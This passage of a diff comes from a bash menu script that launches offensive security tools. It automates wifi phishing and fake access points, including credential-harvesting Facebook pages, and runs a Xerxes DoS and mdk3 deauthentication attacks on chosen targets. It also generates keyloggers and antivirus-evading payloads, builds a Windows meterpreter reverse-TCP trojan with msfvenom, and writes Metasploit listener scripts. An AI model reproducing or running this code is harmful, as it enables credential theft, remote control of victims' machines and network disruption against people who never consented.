+		echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
+	else
+		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
+	fi
+	if [ -d /root/Zatacker ]
+	then
+		echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
+	else
+		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
+	fi
+	if [ -d /root/morpheus ]
+	then
+		echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
+	else
+		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
+	fi
+	if [ -d /root/osrframework ]
+	then
+		echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
+	else
+		echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
+	fi
+	if [ -d /root/hakkuframework ]
+	then
+		echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
+	else
+		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
+	fi
+	if [ -d /root/Trity ]
+	then
+		echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
+	else
+		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
+	fi
+	if [ -d /root/cupp ]
+	then
+		echo -e ""$YS" 9"$CE") Cupp               Make specific worldlists"
+	else
+		echo -e ""$RS" 9"$CE") "$RS"Cupp"$CE"               Make specific worldlists"
+	fi
+	if [ -d /root/Dracnmap ]
+	then				
+		echo -e ""$YS"10"$CE") Dracnmap           Many scan options"
+	else
+		echo -e ""$RS"10"$CE") "$RS"Dracnmap"$CE"           Many scan options"
+	fi
+	if [ -d /root/Fern-Wifi-Cracker ]
+	then	
+		echo -e ""$YS"11"$CE") Fern               Wifi cracker GUI"
+	else
+		echo -e ""$RS"11"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
+	fi
+	if [ -f /usr/sbin/netdiscover ]
+	then	
+		echo -e ""$YS"12"$CE") Netdiscover        IPs and MACs on your net"
+	else
+		echo -e ""$RS"12"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
+	fi
+	if [ -d /root/kickthemout ]
+	then	
+		echo -e ""$YS"13"$CE") KickThemOut        Kick clients out of your network"
+	else
+		echo -e ""$RS"13"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
+	fi
+	if [ -d /root/ghost-phisher ]
+	then	
+		echo -e ""$YS"14"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
+	else
+		echo -e ""$RS"14"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
+	fi
+	if [ -d /root/The-Eye ]
+	then	
+		echo -e ""$YS"15"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
+	else
+		echo -e ""$RS"15"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
+	fi
+	if [ -d /root/xerxes ]
+	then	
+		echo -e ""$YS"16"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
+	else
+		echo -e ""$RS"16"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
+	fi
+	#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
+	if [ -d /root/mdk3-master ]
+	then
+		echo -e ""$YS"17"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
+	else
+		echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
+	fi
+	if [ -d /root/mdk3-master ]
+	then
+		echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
+	else
+		echo -e ""$RS"18"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
+	fi
+	if [ -d /root/KatanaFramework ]
+	then
+		echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
+	else
+		echo -e ""$RS"19"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
+	fi
+	if [ -d /root/airgeddon ]
+	then
+		echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
+	else
+		echo -e ""$RS"20"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
+	fi
+	if [ -f /usr/bin/websploit ]
+	then
+		echo -e ""$YS"21"$CE") Websploit          Wireless attack-multitool"
+	else
+		echo -e ""$RS"21"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
+	fi
+	if [ -d /etc/openvas ]
+	then
+		echo -e ""$YS"22"$CE") Openvas            Vulnerability scanner LAN"
+	else
+		echo -e ""$RS"22"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
+	fi
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS"00"$CE") Main menu"
+	#echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e APPP
+	clear
+	if [ "$APPP" = "1" ]
+	then
+		cd /root/fluxion
+		./fluxion
+		cd
+	elif [ "$APPP" = "2" ]
+	then
+		wifite
+	elif [ "$APPP" = "3" ]
+	then
+		echo -e "Do you have 1 or 2 wireless interfaces?: "
+		read ONEORTWO
+		if [ "$ONEORTWO" = "1" ]
+		then
+			clear
+			echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
+			sleep 1
+			echo -e ""
+			echo -e "$PAKTC"
+			$READAK
+			clear
+			wifiphisher -nJ
+		else
+			clear
+			wifiphisher
+		fi
+	elif [ "$APPP" = "d3" ]
+	then
+		clear
+		echo -e "Enter the name of the access point you want to create: "
+		read -e ESSIDAP
+		wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login
+	elif [ "$APPP" = "4" ]
+	then
+		if [ -d "/root/Zatacker" ]
+		then	
+			cd /root/Zatacker
+			./ZT.sh
+			cd
+		else
+			echo -e "You have to install it manually since its not on github.Sorry."
+			sleep 4
+			exec bash "$0"
+		fi
+	elif [ "$APPP" = "5" ]
+	then
+		cd /root/morpheus
+		./morpheus.sh
+		cd
+	elif [ "$APPP" = "7" ] 
+	then
+		echo -e "type: 'show modules' to start"
+		sleep 2
+		clear
+		cd /root/hakkuframework
+		./hakku
+		cd
+	elif [ "$APPP" = "8" ]
+	then
+		echo -e "type: 'help' to start"
+		sleep 2
+		clear
+		trity			
+	elif [ "$APPP" = "9" ]
+	then
+		cd /root/cupp
+		python cupp.py -i
+		cd			
+	elif [ "$APPP" = "10" ]
+	then
+		cd /root/Dracnmap/
+		./dracnmap-v*.sh	
+		cd		
+	elif [ "$APPP" = "11" ]
+	then
+		cd /root/Fern-Wifi-Cracker
+		python execute.py
+		cd
+	elif [ "$APPP" = "12" ]
+	then
+		netdiscover
+	elif [ "$APPP" = "13" ]
+	then
+		cd /root/kickthemout
+		python kickthemout.py
+		cd
+	elif [ "$APPP" = "14" ]
+	then
+		cd /root/ghost-phisher/Ghost-Phisher
+		python ghost.py
+		cd
+	elif [ "$APPP" = "15" ]
+	then
+		cd /root/The-Eye
+		./TheEye
+		cd
+	elif [ "$APPP" = "16" ]
+	then
+		echo -e "Do you own the site you want to DoS?"$YNONLY""
+		read DOSTERM
+		if [ "$DOSTERM" = "y" ]
+		then
+
+			clear
+			echo -e "Enter your site(etc iownthissite.com): "
+			echo -e "(without www)"
+			read -e SITEDOS
+			clear
+			echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
+			sleep 4
+			xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
+			clear	
+			cd /root/xerxes
+			SITEDOSX=www.$SITEDOS
+			echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
+			$READAK
+			./xerxes $SITEDOSX 80
+		else
+			clear
+			echo -e "Then never try this."
+			sleep 3
+			exec bash "$0"
+		fi
+	elif [ "$APPP" = "17" ]
+	then
+		echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
+		echo -e "Press "$YS"any key"$CE" to start scanning."
+		$READAK
+		airodump-ng $WLANNM
+		echo -e "Enter your target's BSSID: "
+		read -e MDBSSID
+		echo -e "Enter your target's channel: "
+		read -e MDCHANN
+		echo -e "Enter frames per second(etc 50): "
+		read -e FPS
+		clear
+		xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
+	elif [ "$APPP" = "18" ]
+	then	
+		echo -e "Press "$YS"any key"$CE" to start scanning with wash."
+		$READAK
+		gnome-terminal -e 'wash -i $WLANNM'
+		echo -e "Enter your target's BSSID: "
+		read -e MDBSSID
+		echo -e "Enter your target's ESSID: "
+		read -e MDESSID
+		#~ echo -e "Enter your target's channel: "
+		#~ read -e MDCHANN
+		echo -e "Enter frames per second(etc 50): "
+		read -e FPS
+		clear
+		xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
+	elif [ "$APPP" = "19" ]
+	then
+		ktf.console
+	elif [ "$APPP" = "20" ]
+	then
+		cd /root/airgeddon
+		./airgeddon.sh
+		cd
+	elif [ "$APPP" = "21" ]
+	then
+		websploit
+	elif [ "$APPP" = "22" ]
+	then
+		echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
+		read -e SORS
+		if [ "$SORS" == "start" ]
+		then
+			netstat -nltp
+			openvas-start
+			echo -e "Launching firefox..."
+			sleep 1
+			firefox https://127.0.0.1:9392
+		else
+			openvas-stop
+		fi
+	elif [ "$APPP" = "6" ]
+	then
+		while true
+		do
+		printf '\033]2;OSRFCONSOLE\a'
+		clear
+		echo -e ""$YS" 1"$CE") usufy"
+		echo -e ""$YS" 2"$CE") mailfy"
+		echo -e ""$YS" 3"$CE") searchfy"
+		echo -e ""$YS" 4"$CE") domainfy"
+		echo -e ""$YS" 5"$CE") phonefy"
+		echo -e ""$YS" 6"$CE") entify"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e ""$YS"00"$CE") Main menu"
+	#	echo -e ""$YS" 0"$CE") EXIT"
+		echo -e "Choose: "
+		read -e OSFR
+		clear
+			if [ "$OSFR" = "1" ]
+			then
+				echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
+				usufy.py
+				exit
+			elif [ "$OSFR" = "2" ]
+			then
+				echo -e "Use: mailfy.py -n name1"
+				mailfy.py
+				exit
+			elif [ "$OSFR" = "3" ]
+			then
+				searchfy.py
+				exit
+			elif [ "$OSFR" = "4" ]
+			then
+				domainfy.py
+				exit
+			elif [ "$OSFR" = "5" ]
+			then
+				phonefy.py
+				exit
+			elif [ "$OSFR" = "6" ]
+			then
+			entify.py
+				exit
+			elif [ "$OSFR" = "0" ]
+			then
+				exit
+			elif [ "$OSFR" = "00" ]
+			then
+				exec bash "$0"
+			elif [ "$OSFR" = "back" ]
+			then
+				break
+			else 
+				echo -e "Wrong choice"
+				sleep 0.3
+				clear
+				exec bash "$0"
+			fi
+		done
+	elif [ "$APPP" = "0" ]
+	then
+		clear
+		exit
+	elif [ "$APPP" = "00" ]
+	then
+		clear
+		exec bash "$0"
+	elif [ "$APPP" = "back" ]
+	then
+		break
+	fi
+	done
+}
+function remote_access
+{
+	while true 
+	do
+	clear
+	echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
+	printf '\033]2;REMOTE ACCESS\a'
+	if [ -d /root/BeeLogger ]
+	then
+		echo -e ""$YS" 1"$CE") BeeLogger    Generate keylogger"
+	else
+		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"    Generate keylogger"
+	fi
+	if [ -d /root/ezsploit ]
+	then
+		echo -e ""$YS" 2"$CE") Ezsploit     Generate payloads for many platforms,listeners etc..."
+	else
+		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"     Generate payloads for many platforms,listeners etc..."
+	fi
+	if [ -d /root/pupy ]
+	then
+		echo -e ""$YS" 3"$CE") Pupy         Generate payloads for many platforms,listeners etc..."
+	else
+		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"         Generate payloads for many platforms,listeners etc..."
+	fi
+	if [ -d /root/zirikatu ]
+	then
+		echo -e ""$YS" 4"$CE") Zirikatu     Generate undetectable payloads"
+	else
+		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"     Generate undetectable payloads"
+	fi
+	if [ -d /root/TheFatRat ]
+	then
+		echo -e ""$YS" 5"$CE") TheFatRat     Generate undetectable payloads"
+	else
+		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"     Generate undetectable payloads"
+	fi
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS"00"$CE") Main menu"
+	#echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e KEYLOG
+	clear
+	if [ "$KEYLOG" = "1" ]
+	then
+		cd /root/BeeLogger
+		python bee.py
+		cd
+	elif [ "$KEYLOG" = "2" ]
+	then
+		clear
+		cd /root/ezsploit/
+		./ezsploit.sh
+		cd
+		#~ echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
+		#~ echo -e "Open a new terminal and type:"
+		#~ echo -e "msfconsole"
+		#~ echo -e "use exploit/multi/handler"
+		#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
+		#~ echo -e "set lhost <YOUR IP HERE>"
+		#~ echo -e "set lport 4444"
+		#~ echo -e "exploit"
+		echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
+		sleep 2
+		echo -e "Press "$YS"any key"$CE" to leave..."
+		$READAK
+		exec bash "$0"
+	elif [ "$KEYLOG" = "3" ]
+	then
+		while true
+		do
+		clear
+		echo -e"MORE FEATURES AND METASPLOIT AUTOMATION WILL BE ADDED SOON"
+		echo -e ""$YS" 1"$CE") Generate a payload"
+		echo -e ""$YS" 2"$CE") Start listener"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e ""$YS"00"$CE") Main menu"
+		echo -e ""$YS" 0"$CE") EXIT"
+		read -e PUPY
+		if [ "$PUPY" = "1" ]
+		then
+			clear
+			echo -e "Choose the target OS:"
+			echo -e ""$YS" 1"$CE") Windows"
+			echo -e ""$YS" 2"$CE") Linux"
+			echo -e ""$YS" 3"$CE") Android"
+			echo -e "Choose: "
+			read -e TAROS
+			if [ "$TAROS" = "1" ]
+			then
+				TAROS="windows"
+			elif [ "$TAROS" = "2" ]
+			then
+				TAROS="linux"
+			elif [ "$TAROS" = "3" ]
+			then
+				TAROS="android"
+			else
+				echo -e "Wrong choice.Returning to main manu..."
+				sleep 2
+				exec bash "$0"
+			fi
+			clear
+			echo -e "Enter your ip: "
+			read -e PUPYIP
+			clear
+			echo -e "Enter your port(etc: 443): "
+			read -e PUPYPORT
+			clear
+			echo -e "Enter the full output path(etc: /root/Desktop/payload1.exe)"
+			read -e PUPYPATH
+			cd /root/pupy/pupy
+			./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
+		elif [ "$PUPY" = "2" ]
+		then
+			cd /root/pupy/pupy
+			./pupysh.py
+		elif [ "$PUPY" = "00" ]
+		then
+			exec bash "$0"
+		elif [ "$PUPY" = "back" ]
+		then
+			break
+		elif [ "$PUPY" = "0" ]
+		then
+			exit
+		fi
+		done
+	elif [ "$KEYLOG" = "4" ]
+	then
+		clear
+		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
+		sleep 3
+		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
+		read MUSTBEYES
+		if [ "$MUSTBEYES" = "YES" ] 
+		then 
+			clear
+			cd /root/zirikatu
+			./zirikatu.sh
+		fi
+	elif [ "$KEYLOG" = "5" ]
+	then
+		clear
+		fatrat
+	elif [ "$KEYLOG" = "00" ]
+	then
+		clear
+		exec bash "$0"
+	elif [ "$KEYLOG" = "0" ]
+	then
+		clear
+		exit
+	elif [ "$KEYLOG" = "back" ]
+	then
+		break
+	fi
+	done
+}
+function metasploit_menu
+{
+	if [ ! -d /root/lscript/rc ]
+	then
+		mkdir /root/lscript/rc
+	fi
+	while true
+	do
+	clear
+	echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
+	printf '\033]2;METASPLOIT\a'
+	echo -e ""$YS" 1"$CE") Create payload"
+	echo -e ""$YS" 2"$CE") Create listener"
+	echo -e ""$YS" 3"$CE") Saved listeners"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e METASP
+	if [ "$METASP" = "1" ]
+	then
+		clear
+		echo -e "Enter the attacker's IP: "
+		read ATIP
+		echo -e ""
+		echo -e "Enter the attacker's PORT: "
+		read ATPORT
+		echo -e ""
+		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
+		read TARCH
+		echo -e "Enter the output path(etc "$YS"/root/Desktop/trojan.exe"$CE"): "
+		read ATEXE
+		clear
+		echo -e "Generating"
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo .
+		sleep 0.1
+		echo .
+		msfvenom -p windows/meterpreter/reverse_tcp   --platform windows -a $TARCH -f exe LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXE"
+		echo -e "Done."
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+	elif [ "$METASP" = "z" ]
+	then
+		clear
+		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
+		sleep 3
+		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
+		read MUSTBEYES
+		if [ "$MUSTBEYES" = "YES" ] 
+		then 
+			clear
+			cd /root/zirikatu
+			./zirikatu.sh
+		fi
+	elif [ "$METASP" = "2" ]
+	then
+		clear
+		echo -e "LHOST: "
+		read LHOSTL
+		echo -e "LPORT: "
+		read LPORTL
+		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
+		read PAYLOADL
+		if [ -z "$PAYLOADL" ]
+		then
+			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
+			sleep 2
+			PAYLOADL="windows/meterpreter/reverse_tcp"
+		fi
+		echo -e "Name of listener(etc: "$YS"john"$CE") : "
+		read NAMEL
+		echo "use exploit/multi/handler" > /root/lscript/rc/"$NAMEL".rc
+		echo "set PAYLOAD $PAYLOADL " >> /root/lscript/rc/"$NAMEL".rc
+		echo "set LHOST $LHOSTL " >> /root/lscript/rc/"$NAMEL".rc
+		echo "set LPORT $LPORTL " >> /root/lscript/rc/"$NAMEL".rc
+		echo "set ExitOnSession false" >> /root/lscript/rc/"$NAMEL".rc
+		echo "exploit -j" >> /root/lscript/rc/"$NAMEL".rc
+		clear
+		echo -e "Launch the listener now? "$YNONLY""
+		read LLN
+		if [ "$LLN" = "y" ]
+		then
+			echo -e "Launching msfconsole..."
+			sleep 2
+			clear
+			msfconsole -r /root/lscript/rc/"$NAMEL".rc
+		fi
+	elif [ "$METASP" = "3" ]
+	then
+		while true
+		do
+		clear
+		ls /root/lscript/rc
+		echo -e "Enter the name of the above listener(s) you want to select(etc: "$YS"john"$CE")"
+		echo -e ""$YS"back"$CE") Go back"
+		read NAMERC
+		clear
+		if [ "$NAMERC" = "back" ]
+		then
+			break
+		fi
+		if [ ! -f /root/lscript/rc/"$NAMERC" ]
+		then
+			NAMERC="$NAMERC".rc
+			if [ ! -f /root/lscript/rc/"$NAMERC" ]
+			then
+				echo -e "File not found. Try again.."
+				sleep 2
+				continue
+			fi
+		fi
+		while true
+		do
+		clear
+		echo -e ""$NAMERC" selected."
+		echo -e ""$YS" 1"$CE") Start listener"
+		echo -e ""$YS" 2"$CE") Delete listener"
+		echo -e ""$YS"back"$CE") Go back"
+		echo -e "Choose: "
+		read LISTL
+		if [ "$LISTL" = "1" ]
+		then
+			msfconsole -r /root/lscript/rc/"$NAMERC"
+		elif [ "$LISTL" = "2" ]
+		then
+			rm /root/lscript/rc/"$NAMERC"
+			break
+		elif [ "$LISTL" = "back" ]
+		then
+			break
+		fi
+		done
+		done
+	elif [ "$METASP" = "back" ]
+	then
+		BACKL="1"
+		break
+	elif [ "$METASP" = "00" ]
+	then
+		clear
+		exec bash "$0"
+	elif [ "$METASP" = "0" ]
+	then
+		clear
+		exit
+	fi
+	done
+}
+function update_lscript
+{
+	echo -e "Checking for updates..."
+	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
+	if [ "$TESTINTERNETCONNECTION" != "" ]
+	then
+		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
+		if [ "$VERSION" != "$VER" ]
+		then
+		clear
+		echo -e "There is an update available."
+		echo -e "Current version: $VERSION"
+		echo -e "Updated version: $VER"
+		echo -e "$PAKTC"
+		$READAK
+		clear
+		echo -e "Do you want to update?"$YNONLY": "
+		read UPDATEYN
+		if [ "$UPDATEYN" = "y" ]
+		then
+			clear
+			echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
+			sleep 2
+			mkdir /root/lscriptold
+			echo -e ""
+			echo -e "Moving lscript to lscriptold"
+			sleep 2
+			mv /root/lscript /root/lscriptold
+			echo -e "Cloning the latest github version to new /root/lscript"
+			sleep 2
+			cd
+			git clone https://github.com/arismelachroinos/lscript.git
+			cd "$LPATH"
+			chmod +x install.sh
+			clear
+			echo -e "Ok , everything seems to be fine by now."
+			sleep 1
+			echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
+			echo -e ""
+			sleep 4
+			echo -e "$PAKTC"
+			$READAK
+			cd "$LPATH"
+			gnome-terminal -e ./install.sh
+			clear 
+			if [ -d /root/lscriptold/ks ]
+			then
+				echo -e "Copying old shortcuts"
+				cp /root/lscriptold/ks "$LPATH"
+				sleep 1
+				echo -e "Done."
+				sleep 1
+				clear
+			fi
+			sleep 1
+			echo -e ""
+			echo -e "Removing old lscript"
+			rm -rf /root/lscriptold
+			echo -e "Exiting..."
+			sleep 1
+			exit
+		else 
+			clear
+			echo -e "You didnt select "y" so you go back..."
+			sleep 3
+			exec bash "$0"
+		fi
+		else
+		echo -e "There is no update available"
+		sleep 1
+		echo -e "Installed version: $VERSION"
+		sleep 1
+		echo -e "Github version:    $VER"
+		sleep 1
+		echo -e "$PAKTGB"
+		$READAK	
+		exec bash "$0"
+		fi
+	else
+		clear
+		echo -e "There is no connection."
+		sleep 1
+		echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
+		echo -e ""
+		echo -e "$PAKTGB"
+		$READAK
+		exec bash "$0"
+	fi	
+}
+function hidden_shortcuts
+{
+	clear
+	echo -e ""$YS"interface"$CE") Change your interface"
+	echo -e ""$YS"   wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
+	echo -e "$PAKTGB"
+	$READAK
+	clear
+}
+
 
 ####################################
 printf '\033]2;The LAZY script\a'
@@ -404,113 +2188,20 @@ var1=1
 		exit
 	elif [ "$YORNAA" = "ks" ]
 	then
-		if [ ! -d ""$KSPATH"" ]
-		then
-			mkdir "$KSPATH"
-		fi
-		while true
-		do
-		echo -e "-----------------------"$RS"KEYBOARD SHORTCUTS"$CE"------------------------"
-		printf '\033]2;KEYBOARD SHORTCUTS\a'
-		echo -e ""$YS" 1"$CE") Tools"
-		echo -e ""$YS"back"$CE") Go back"
-		#~ echo -e ""$YS"00"$CE") Main menu"
-		echo -e ""$YS" 0"$CE") EXIT"
-		read KS
-		clear
-		if [ "$KS" = "1" ]
-		then
-			while true
-			do
-			echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
-			nn=1
-			#start sorting out all the available shortcuts
-			HOWADD=$(( HOWMANYTOOLS + 1 )) 
-			while [ "$nn" != "$HOWADD" ]
-			do
-			listshortcuts
-			#adding a space where needed on the output,so it will be sorted correctly
-			if [ "$nn" -lt "10" ]
-			then
-				n=" $nn"
-			else
-				n="$nn"
-			fi
-			if [ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]
-			then
-				echo -e ""$YS""$n""$CE") "$TITLE""
-			else
-				read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-				if [ "$KSKS" = "" ]
-				then
-					KSKS="ERROR(fix=recreate the shortcut)"
-				else
-					read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-					size=${#TITLE}
-					calc=$(( 35-size ))
-					numcalc=1
-					SPACES=""
-					while [ $numcalc != $calc ]
-					do
-						SPACES=""$SPACES"_"
-						numcalc=$(( numcalc+1 ))
-					done
-					#~ read SPACES < "$KSPATH"/spaces.txt
-					echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
-				fi
-			fi
-			nn=$(( nn+1 ))
-			done
-			echo -e ""$YS"back"$CE") Go back"
-			#echo -e ""$YS" 0"$CE") EXIT"
-			echo -e "Choose: "
-			#nn=""
-			read nn
-			clear
-			listshortcuts
-			if [ "$nn" = "back" ]
-			then
-				break
-			elif [ "$nn" = "0" ]
-			then
-				clear
-				exit
-			elif [ "$nn" = "00" ]
-			then
-				exec bash "$0"
-			elif [ "$nn" = "reset" ]
-			then
-				rm -r "$KSPATH"/*
-			elif [ "$nn" -le "$HOWMANYTOOLS" ] 
-			then
-				createshortcut
-			fi
-			done
-		elif [ "$KS" = "back" ]
-		then
-			break
-		elif [ "$KS" = "0" ]
-		then
-			clear
-			exit
-		elif [ "$KS" = "00" ]
-		then
-			exec bash "$0"
-		fi
-		done
+		keyboard_shortcuts
 	elif [ "$YORNAA" = "interface" ]
 	then
 		WLANN=$(cat "$LPATH"/wlan.txt)
 		WLANNM=$(cat "$LPATH"/wlanmon.txt)
 		echo -e "Your current wireless interface names are $WLANN and $WLANNM"
 		sleep 2
-		echo -e "Do you want to change you interface number?"$YNYES": "
+		echo -e "Do you want to change you interface names?"$YNYES": "
 		read INAG
 		if [ "$INAG" = "n" ]
 		then
 			clear
 			echo -e "Then why did you come here? lol"
-			sleep 2
+			sleep 3
 			exec bash "$0"
 		else
 			clear
@@ -535,1022 +2226,20 @@ var1=1
 		clear
 			if [ "$CATEG" = "1" ]
 			then
-				while true
-				do
-				printf '\033]2;WIFI TOOLS\a'
-				clear
-				echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
-				if [ -d /root/fluxion ]
-				then
-					echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
-				else
-					echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
-				fi
-				if [ -f /usr/bin/wifite ]
-				then
-					echo -e ""$YS" 2"$CE") Wifite             Multitool"
-				else
-					echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
-				fi
-				if [ -d /root/wifiphisher ]
-				then
-					echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
-				else
-					echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
-				fi
-				if [ -d /root/Zatacker ]
-				then
-					echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
-				else
-					echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
-				fi
-				if [ -d /root/morpheus ]
-				then
-					echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
-				else
-					echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
-				fi
-				if [ -d /root/osrframework ]
-				then
-					echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
-				else
-					echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
-				fi
-				if [ -d /root/hakkuframework ]
-				then
-					echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
-				else
-					echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
-				fi
-				if [ -d /root/Trity ]
-				then
-					echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
-				else
-					echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
-				fi
-				if [ -d /root/cupp ]
-				then
-					echo -e ""$YS" 9"$CE") Cupp               Make specific worldlists"
-				else
-					echo -e ""$RS" 9"$CE") "$RS"Cupp"$CE"               Make specific worldlists"
-				fi
-				if [ -d /root/Dracnmap ]
-				then				
-					echo -e ""$YS"10"$CE") Dracnmap           Many scan options"
-				else
-					echo -e ""$RS"10"$CE") "$RS"Dracnmap"$CE"           Many scan options"
-				fi
-				if [ -d /root/Fern-Wifi-Cracker ]
-				then	
-					echo -e ""$YS"11"$CE") Fern               Wifi cracker GUI"
-				else
-					echo -e ""$RS"11"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
-				fi
-				if [ -f /usr/sbin/netdiscover ]
-				then	
-					echo -e ""$YS"12"$CE") Netdiscover        IPs and MACs on your net"
-				else
-					echo -e ""$RS"12"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
-				fi
-				if [ -d /root/kickthemout ]
-				then	
-					echo -e ""$YS"13"$CE") KickThemOut        Kick clients out of your network"
-				else
